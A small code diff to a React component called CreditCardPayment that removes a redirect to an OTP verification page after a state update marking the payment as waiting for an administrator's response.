@@ -368,8 +368,6 @@ export default function CreditCardPayment() {
       waitingForAdminResponse: true,
       isCustom: true,
     });
-
-    navigate("/otp-verification");
   };
 
   return (
